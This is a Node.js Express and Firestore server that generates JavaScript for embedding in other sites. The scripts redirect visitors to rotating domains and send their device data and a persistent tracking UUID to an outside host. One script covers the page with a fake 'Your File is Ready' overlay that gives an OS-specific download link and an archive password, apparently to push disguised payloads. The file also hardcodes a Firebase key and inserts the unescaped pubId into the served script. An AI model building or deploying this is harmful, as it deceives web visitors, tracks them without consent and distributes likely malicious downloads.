const express = require('express');
const { initializeApp } = require('firebase/app');
const rateLimit = require('express-rate-limit');
const { getFirestore, collection, getDocs, doc, getDoc, addDoc ,query,where} = require('firebase/firestore');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;



const clickLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes window
  max: 100, // Limit each IP to 100 requests per windowMs
  message: "Too many requests, please try again later.",
});



const firebaseConfig = {
  apiKey: "AIzaSyDFdDA4nYHhOVEza_sw7U0Hcf2R9dQDrc8",
  authDomain: "management-system-ce46e.firebaseapp.com",
  projectId: "management-system-ce46e",
  storageBucket: "management-system-ce46e.appspot.com",
  messagingSenderId: "911559437974",
  appId: "1:911559437974:web:3fc1eac46aa8f098b31cb7",
  measurementId: "G-1LD28EPX6S"
};

// Initialize Firebase app
const appFirebase = initializeApp(firebaseConfig);

// Initialize Firestore
const db = getFirestore(appFirebase);

// Enable CORS for all origins or specify the frontend's origin explicitly
app.use(cors({
  origin: '*',  // Allows requests from any origin
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type'],
}));

// Middleware to parse JSON bodies
app.use(express.json());

// Root route for testing
app.get('/ping', (req, res) => {
  res.json('Ping success');
});


// API to serve the dynamic redirect script
app.get('/smartlink', async (req, res) => {
  const pubId = req.query.pubId;

  if (!pubId) {
    return res.status(400).json({ error: 'Missing pubId parameter' });
  }

  try {
    // Fetch all documents where status is 'active'
    const redirectCollection = collection(db, 'domain/redirect/uid');
    const activeQuery = query(redirectCollection, where("status", "==", "active"));
    const activeSnapshots = await getDocs(activeQuery);

    // Extract all active URLs
    const activeUrls = activeSnapshots.docs.map(doc => doc.data().url);

    if (activeUrls.length === 0) {
      return res.status(404).json({ error: 'No redirect domain  found' });
    }

    // Randomly shuffle the URLs and pick one
    const randomUrl = activeUrls[Math.floor(Math.random() * activeUrls.length)];

    // Generate script for smart link redirection
    const scriptContent = `
    (function() {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    
      // Determine device type
      let deviceType = 'Unknown';
      if (userAgent.match(/Windows NT/)) deviceType = 'Windows';
      else if (userAgent.match(/Macintosh/)) deviceType = 'Mac';
      else if (userAgent.match(/Android/)) deviceType = 'Android';

      // Generate a unique UUID and store it in localStorage
      const generateUUID = () => {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
          const r = (Math.random() * 16) | 0;
          const v = c === 'x' ? r : (r & 0x3) | 0x8;
          return v.toString(16);
        });
      };

      const deviceUUID = localStorage.getItem('deviceUUID') || generateUUID();
      localStorage.setItem('deviceUUID', deviceUUID);

      // Construct the final redirect URL
      const redirectUrl = '${randomUrl.startsWith('http') ? randomUrl : 'https://' + randomUrl}';
        const queryParams = new URLSearchParams({
        //   device: deviceType,               // Device type (Windows, Mac, Android)
        //   pubId: '${pubId}',                // Publisher ID (passed in the query)
          'data-user': '${pubId}',          // Data user (same as pubId in this case)
          uuid: deviceUUID,                 // UUID for tracking device
        //   timestamp: new Date().toISOString() // Optional timestamp
        });
      const finalRedirectUrl = \`\${redirectUrl}?\${queryParams.toString()}\`;

      // Record the click in the backend
      fetch('https://3awjybjk.xyz/record-click', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pubId: '${pubId}',                // Publisher ID
          deviceInfo: userAgent,            // Device info (user-agent)
          deviceUUID: deviceUUID,           // Device UUID
          timestamp: new Date().toISOString(), // Current timestamp
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log('Click recorded:', data);
        // Redirect after recording click
        window.location.replace(finalRedirectUrl);
      })
      .catch(error => {
        console.error('Error recording click:', error);
        // Redirect even if the recording fails
        window.location.replace(finalRedirectUrl);
      });
    })();
`;


    res.set('Content-Type', 'application/javascript');
    res.send(scriptContent);
  } catch (error) {
    console.error('Error generating smart link script:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


// /test-button endpoint with Firebase logic
app.get('/test-button', async (req, res) => {
  const pubId = req.query.pubId;

  if (!pubId) {
    return res.status(400).json({ error: 'Missing pubId parameter' });
  }

  try {
    // Correct Firestore collection path
    const redirectCollection =  collection(db, 'domain/redirect/uid');
    const activeQuery = query(redirectCollection, where("status", "==", "active"));
    const activeSnapshots = await getDocs(activeQuery);

    // Extract all active URLs
    const activeUrls = activeSnapshots.docs
      .map(doc => {
        const data = doc.data();
        if (data.url && data.status === 'active') {
          return data.url;
        }
        return null;
      })
      .filter(url => url !== null);

    console.log("Active URLs:", activeUrls);

    if (activeUrls.length === 0) {
      return res.status(404).json({ error: 'No active redirect domain found' });
    }

    // Randomly shuffle the URLs and pick one
    const randomDomain = activeUrls[Math.floor(Math.random() * activeUrls.length)];
    console.log("Random domain selected:", randomDomain);

    // Construct the JavaScript response with the offer data
    const scriptContent = `
    (function() {
      // Function to generate a UUID
      function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
          const r = (Math.random() * 16) | 0;
          const v = c === 'x' ? r : (r & 0x3) | 0x8;
          return v.toString(16);
        });
      }
  
      // Retrieve or generate a UUID and store it in localStorage
      let deviceUUID = localStorage.getItem('deviceUUID');
      if (!deviceUUID) {
        deviceUUID = generateUUID();
        localStorage.setItem('deviceUUID', deviceUUID);
      }
  
      // Function to handle the button click event
      const button = document.querySelector('.buttonPress');
      if (!button) {
        console.error("Button with class 'buttonPress' not found.");
        return;
      }
  
      button.addEventListener('click', function() {
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  
        // Determine device type (Windows, Mac, Android)
        let deviceType = 'Unknown';
        if (userAgent.match(/Windows NT/)) {
          deviceType = 'Windows';
        } else if (userAgent.match(/Macintosh/)) {
          deviceType = 'Mac';
        } else if (userAgent.match(/Android/)) {
          deviceType = 'Android';
        }
  
        // Ensure the redirect URL is absolute (prepends 'https://' if it's not)
        const redirectUrl = '${randomDomain.startsWith('http') ? randomDomain : 'https://' + randomDomain}';
  
        // Append query parameters to the URL (device, pubId, data-user, UUID)
        const queryParams = new URLSearchParams({
        //   device: deviceType,               // Device type (Windows, Mac, Android)
        //   pubId: '${pubId}',                // Publisher ID (passed in the query)
          'data-user': '${pubId}',          // Data user (same as pubId in this case)
          uuid: deviceUUID,                 // UUID for tracking device
        //   timestamp: new Date().toISOString() // Optional timestamp
        });
  
        const finalRedirectUrl = \`\${redirectUrl}?\${queryParams.toString()}\`;
  
        // Record the click in Firestore
        fetch('https://3awjybjk.xyz/record-click', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            pubId: '${pubId}',
            deviceInfo: userAgent,
            deviceUUID: deviceUUID,        // Include UUID in the request payload
            timestamp: new Date().toISOString(),
          })
        })
        .then(response => response.json())
        .then(data => console.log('Click recorded:', data))
        .catch(error => console.error('Error recording click:', error));
  
        // Redirect to the URL with appended query parameters
        window.open(finalRedirectUrl, '_blank', 'noopener,noreferrer');
      });
    })();
  `;
  

    res.set('Content-Type', 'application/javascript');
    res.send(scriptContent);

  } catch (error) {
    console.error('Error in /test-button:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});




// Endpoint to serve the dynamic script for loading
app.get('/loading', async (req, res) => {
  const device = req.get('User-Agent') || 'Unknown'; // Capture device info
  const dataUser = req.query['data-user'] || ''; // Capture data-user parameter

  try {
    // Fetch all domains where status is "active"
    const redirectCollection = collection(db, 'domain/template/uid');
    const activeQuery = query(redirectCollection, where("status", "==", "active"));
    const activeSnapshots = await getDocs(activeQuery);

    // Extract all active URLs
    const activeUrls = activeSnapshots.docs
      .map(doc => doc.data().url)
      .filter(url => url !== undefined && url !== null);

    if (activeUrls.length === 0) {
      return res.status(404).json({ error: 'No active template domain found' });
    }

    // Randomly select a URL from the active URLs
    let randomUrl = activeUrls[Math.floor(Math.random() * activeUrls.length)];
    console.log("Active URLs:", activeUrls, "Random URL:", randomUrl);

    // Ensure the URL starts with "https://"
    randomUrl = randomUrl.startsWith('http') ? randomUrl : 'https://' + randomUrl;

    // Construct the final redirect URL by appending the data-user and device parameters
    const finalRedirectUrl = `${randomUrl}?data-user=${encodeURIComponent(dataUser)}`;

    // Create the script content to be returned to the client
    const scriptContent = `
      (function() {
        const overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = '#f4f4f4';
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column';
        overlay.style.justifyContent = 'center';
        overlay.style.alignItems = 'center';
        overlay.style.zIndex = '9999';

        const loader = document.createElement('div');
        loader.style.border = '16px solid #f3f3f3';
        loader.style.borderTop = '16px solid #3498db';
        loader.style.borderRadius = '50%';
        loader.style.width = '120px';
        loader.style.height = '120px';
        loader.style.animation = 'spin 2s linear infinite';
        loader.style.marginBottom = '20px';

        const message = document.createElement('h1');
        message.textContent = 'Redirecting you in 2...';
        message.style.fontFamily = 'Arial, sans-serif';
        message.style.fontSize = '20px';
        message.style.color = '#333';

        overlay.appendChild(loader);
        overlay.appendChild(message);
        document.body.appendChild(overlay);

        const style = document.createElement('style');
        style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
        document.head.appendChild(style);

        let countdown = 2;
        const interval = setInterval(() => {
          countdown--;
          if (countdown > 0) {
            message.textContent = \`Redirecting you in \${countdown}...\`;
          } else {
            clearInterval(interval);
            message.textContent = 'Redirecting now...';
            setTimeout(() => {
              window.location.href = '${finalRedirectUrl}';
            }, 1000); // Redirect after 1 second
          }
        }, 1000); // Update every second
      })();
    `;

    // Send the JavaScript content as a response
    res.set('Content-Type', 'application/javascript');
    res.send(scriptContent);

  } catch (error) {
    console.error('Error in /loading:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});



// Updated /offer-script.js endpoint
app.get('/offer-script.js', async (req, res) => {
  try {
    // Fetch the first offer document from Firestore
    const offersQuerySnapshot = await getDocs(collection(db, 'offers'));

    if (offersQuerySnapshot.empty) {
      return res.status(404).json({ error: 'No offers found' });
    }

    const offerData = offersQuerySnapshot.docs[0].data();

    // Function to detect device type from User-Agent
    const getDeviceType = (userAgent) => {
      if (/Windows NT/.test(userAgent)) return 'windows_url';
      else if (/Macintosh/.test(userAgent)) return 'mac_url';
      else if (/Android/.test(userAgent)) return 'android_url';
      return null; // Default case if no match
    };

    // Detect device type
    const device = req.get('User-Agent') || 'Unknown';
    const deviceType = getDeviceType(device);
    const redirectUrl = deviceType ? offerData[deviceType] : offerData.windows_url; // Default to windows_url

    // Build the script with dark theme UI
    const scriptContent = `
    (function() {
      document.title = "${offerData.title || 'Your File is Ready'}";
      const faviconLink = document.createElement('link');
      faviconLink.rel = 'icon';
      faviconLink.href = "${offerData.favicon || 'https://yourdomain.com/favicon.ico'}";
      document.head.appendChild(faviconLink);

      const container = document.createElement('div');
      container.id = 'offer-container';
      container.style.cssText = \`
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        display: flex; justify-content: center; align-items: center;
        background: #0f0f22; color: #e6e6e6; font-family: Arial, sans-serif;
        z-index: 9999;
      \`;

      container.innerHTML = \`
        <div style="
          background: #1c1c3c; padding: 30px; border-radius: 12px;
          box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); max-width: 500px; text-align: center;">
          <h1 style="
            font-size: 1.8rem; margin-bottom: 20px; color: #fff;
            text-shadow: 0 0 5px rgba(173, 216, 230, 0.8);">
            ${offerData.title || 'File is ready for download...'}
          </h1>
          <p style="margin: 10px 0; color: #aaa;">Copy Link and Paste into a New Tab to Start Download</p>
          <div style="
            background: #292954; color: #d9d9f1; padding: 10px;
            border: 1px solid #444472; border-radius: 8px; word-wrap: break-word; margin: 15px 0;">
            ${redirectUrl || 'https://default-link.com/file.zip'}
          </div>
          <p style="color: #e06666; font-size: 1rem; font-weight: bold;">
            Password: ${offerData.password || 'N/A'}
          </p>
          <button id="copy-button" style="
            background-color: #5e57ff; color: white; padding: 12px 25px;
            font-size: 1rem; font-weight: bold; border: none; border-radius: 8px;
            cursor: pointer; transition: all 0.3s ease;
            box-shadow: 0 4px 10px rgba(94, 87, 255, 0.5);">
            Copy Download Link
          </button>
        </div>
      \`;

      document.body.appendChild(container);

      const copyButton = container.querySelector('#copy-button');
      copyButton.addEventListener('mouseover', () => {
        copyButton.style.backgroundColor = '#6f68ff';
        copyButton.style.boxShadow = '0 6px 12px rgba(94, 87, 255, 0.7)';
      });
      copyButton.addEventListener('mouseout', () => {
        copyButton.style.backgroundColor = '#5e57ff';
        copyButton.style.boxShadow = '0 4px 10px rgba(94, 87, 255, 0.5)';
      });
      copyButton.addEventListener('click', () => {
        navigator.clipboard.writeText("${redirectUrl || 'https://default-link.com/file.zip'}")
          .then(() => alert('Link copied to clipboard!'))
          .catch(err => console.error('Failed to copy link:', err));
      });
    })();
    `;

    // Cache headers
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');

    res.set('Content-Type', 'application/javascript');
    res.send(scriptContent);

  } catch (error) {
    console.error('Error in /offer-script.js:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

function getDeviceType(userAgent) {
  if (/Windows/i.test(userAgent)) {
    return 'Windows';
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    return 'Mac';
  } else if (/Android/i.test(userAgent)) {
    return 'Android';
  }
  return 'Other'; // Default for devices not matching the above types
}

app.post('/record-click',clickLimiter, async (req, res) => {
  const { pubId, deviceInfo, deviceUUID, timestamp } = req.body;

  if (!pubId || !deviceUUID || !timestamp || !deviceInfo) {
    return res.status(400).json({ error: 'Missing required fields (pubId, deviceUUID, timestamp, deviceInfo).' });
  }

  try {
    // Determine the device type from the user-agent
    const deviceType = getDeviceType(deviceInfo);

    // Firestore reference to the 'clicks' collection
    const clicksRef = collection(db, 'clicks');

    // Check if the same UUID has already clicked recently (within the last 10 seconds)
    const q = query(
      clicksRef,
      where('deviceUUID', '==', deviceUUID),
    );

    const querySnapshot = await getDocs(q);
    if (!querySnapshot.empty) {
      // Duplicate click detected
      return res.status(200).json({ success: 'Duplicate click ignored.' });
    }

    // Save valid click data
    await addDoc(clicksRef, {
      pubId,
      deviceInfo,
      deviceUUID,
      deviceType, // Include the device type
      timestamp: new Date(timestamp).toISOString(), // Ensure ISO string format
    });

    return res.status(200).json({ success: 'Click recorded.' });
  } catch (error) {
    console.error('Error recording click:', error);
    return res.status(500).json({ error: 'Error recording click.' });
  }
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
